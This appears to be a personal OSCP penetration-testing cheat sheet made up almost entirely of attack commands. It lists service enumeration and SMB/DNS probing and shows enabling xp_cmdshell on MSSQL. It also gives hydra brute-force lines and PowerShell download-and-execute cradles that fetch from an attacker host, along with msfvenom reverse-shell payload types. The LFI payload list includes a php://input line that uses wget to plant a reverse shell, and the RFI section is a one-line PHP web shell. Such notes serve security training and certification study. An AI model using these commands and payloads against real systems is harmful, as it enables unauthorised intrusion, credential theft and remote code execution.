# OSCP-NOTES
## Enumeration
1. Ports
```
port 21 — FTP (File Transfer Protocol)
port 22 — SSH (Secure Shell)
port 23 — Telnet
port 25 — SMTP (Simple Mail Transfer Protocol)
port 53 — DNS (Domain Name System)
port 443 — HTTP (Hypertext Transport Protocol) and HTTPS (HTTP over SSL)
port 110 — POP3 (Post Office Protocol version 3)
port 135 — Windows RPC
ports 137–139 — Windows NetBIOS over TCP/IP
port 1433 and UDP port 1434 — Microsoft SQL Server
```
* Port 21 FTP
```
ftp <ip>
nc <ip> 21
```
* Port 22 SSH
```
nc -w <ip> 22
```
* Port 25 SMTP
```
nc -w <ip> 25
telnet <ip> 25
* VRFY <user>
```
* Port 53
```
nslookup
*server <ip>
*<ip>
dig axfr <domain_name> @<ip> 
```
* Port 110 POP3
```
telnet <ip> 110
* USER <username>
* PASS <password>
* list #list mails
* retr #cd
```
* Port 139 & 445 SMB
```
#check list
smbclient -L <ip>
enum4linux -a <ip>
smbmap -H <ip>
#Login
smbclient //<ip>/<filename> -U <username>
```
* Port 1433 MsSQL
```
sqsh -S <ip> -U <username> or sqsh -S <ip> -U <username> -P "<password>"
* 1> EXEC SP_CONFIGURE N'show advanced options', 1
* 2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
* 1> EXEC SP_CONFIGURE N'xp_cmdshell', 1
* 2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
* 1> RECONFIGURE
* 2> go
* 1> xp_cmdshell 'dir C:\';
* 2> go
```
## Testing
* SSH login
```
ssh <username@ip> 
```
* Password Decrypt
  * Decode Base64 Encoded Values
  ```
  echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
  ```
  * Decode Hexidecimal Encoded Values
  ```
  echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
  ```
  * GPP Password
  ```
  gpp-decrypt <code>
  ```
* Send a file using netcat
  * send    
  ```
  nc -nlvp <ip> < <filename>
  ```
  * receive 
  ```
  nc -w 3 <ip> > <outputfilename>
  ```
* Brute Force
  ```
  hydra -l <user.txt> -p <pass.txt> <ip> ssh
  hydra -l root -P <password.txt> <ip> telnet  
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> ftp
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> -V http-form-post "/login.php:<request>:<wrong_message>''"
  ```
 * Powershell Download
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOSTIP>/<filename>', '<Location\filename>')"
 powershell -c CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOSTIP>/<filename>')")
 powershell -c "Invoke-WebRequest -Uri <LHOSTIP>/<filename> -Outfile <Location\filename>"
 ```
 * Msfvenom
 ```
 windows/shell/reverse_tcp 
 windows/x64/shell/reverse_tcp
 ------------------------------->exe,asp,aspx
 linux/x86/shell/reverse_tcp
 linux/x64/shell/reverse_tcp
 ------------------------------->elf
 java/jsp_shell_reverse_tcp > war,jsp
 php/reverse_php > php
 ```
* LFI
```
/etc/passwd
/etc/passwd%00 # null byte terminate
../../../../../../etc/passwd%00 # directory traversal
php://filter/convert.base64-encode/resource=/etc/php5/apache2/php.ini%00 
expect://whoami # expect wrapper, direct code execution, not enabled by default
php://input # php code execution, send php code in POST data `<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>`
/proc/self/environ # if readable, write php code in "User Agent" data, and it'll appear within environ
/proc/self/fd/0 # if readable, write php code in "referer" data, and it'll appear within file descriptor. make sure to brute force the fd number 0-10+
/var/lib/php/session s
/tmp/ 
```
* RFI
```
<?php echo shell_exec($_GET['cmd']);?>
```
